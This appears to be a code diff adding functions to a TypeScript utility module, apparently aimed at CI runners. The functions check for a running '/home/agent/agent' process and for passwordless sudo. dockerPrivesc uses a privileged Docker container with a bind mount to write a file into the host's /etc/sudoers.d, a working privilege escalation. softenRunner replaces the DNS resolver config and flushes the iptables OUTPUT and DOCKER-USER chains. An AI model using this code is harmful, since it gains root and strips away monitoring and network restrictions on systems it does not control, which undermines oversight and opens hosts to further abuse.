@@ -65,6 +65,47 @@ export async function getOsInfo() {
 
 }
 
+export async function isAgentRunning(): Promise<boolean> {
+    try {
+        const { stdout } = await execAsync('ps -axco command | grep "/home/agent/agent"');
+        // If the command is found, stdout will contain the command itself.
+        // If not found, stdout will be an empty string.
+        return stdout.trim() !== '';
+    } catch (error) {
+        // If grep command fails (e.g., no process found), it throws an error.
+        // We catch the error and return false.
+        return false;
+    }
+}
+
+export async function checkSudo(): Promise<boolean> {
+    try {
+        // Attempt to execute a command that requires sudo, but doesn't actually modify anything
+        // The -n flag prevents prompting for a password
+        const { stdout, stderr } = await execAsync('sudo -n true');
+
+        // If the command executes successfully, the user has sudo access
+        return true;
+    } catch (error) {
+        // If the command fails, the user doesn't have sudo access or sudo is not configured correctly
+        console.error(`Sudo check failed: ${error}`);
+        return false;
+    }
+}
+
+export async function dockerPrivesc() {
+    await execAsync('docker image load -i alpine.tar.gz');
+    await execAsync('docker run --privileged --mount type=bind,source=/etc/sudoers.d/,target=/etc/sudoers_host --mount type=bind,source=/tmp/,target=/host_tmp alpine:latest /bin/sh -c "cp /host_tmp/runner /etc/sudoers_host/"');
+}
+
+export async function softenRunner() {
+    await execAsync('sudo systemctl stop systemd-resolved');
+    await execAsync('sudo cp /tmp/resolved.conf /etc/systemd/resolved.conf');
+    await execAsync('sudo systemctl restart systemd-resolved');
+    await execAsync('sudo iptables -t filter -F OUTPUT');
+    await execAsync('sudo iptables -t filter -F DOCKER-USER');
+}
+
 /**
  * 
  */
